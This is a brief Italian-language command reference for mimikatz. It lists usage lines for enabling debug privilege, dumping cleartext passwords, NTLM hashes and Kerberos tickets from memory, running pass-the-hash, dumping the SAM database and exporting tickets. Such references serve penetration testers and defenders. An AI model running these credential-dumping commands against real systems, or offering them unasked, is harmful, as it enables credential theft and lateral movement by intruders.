# mimikatz

Interagisce con le credenziali di Windows, esegue dump di credenziali, manipolazione di token e altro. Richiede privilegi di amministratore e in genere viene eseguito su Windows.

## Usage
- `mimikatz` : esegui mimikatz in modalità interattiva
- `mimikatz "privilege::debug"` : abilita i privilegi di debug (necessari per la maggior parte delle operazioni)
- `mimikatz "sekurlsa::logonpasswords"` : esegui il dump di password in chiaro, hash NTLM e ticket Kerberos dalla memoria
- `mimikatz "sekurlsa::pth /user:nome_utente /domain:domain /ntlm:hash /run:cmd"` : esegui Pass-the-Hash con un hash NTLM specifico e avvia un comando
- `mimikatz "lsadump::sam"` : esegui il dump degli hash del database SAM locale
- `mimikatz "kerberos::list /export"` : estrai i ticket Kerberos ed esportali su file
- `exit` : [Interattivo] Esci da mimikatz

## Links
- More information: https://github.com/gentilkiwi/mimikatz
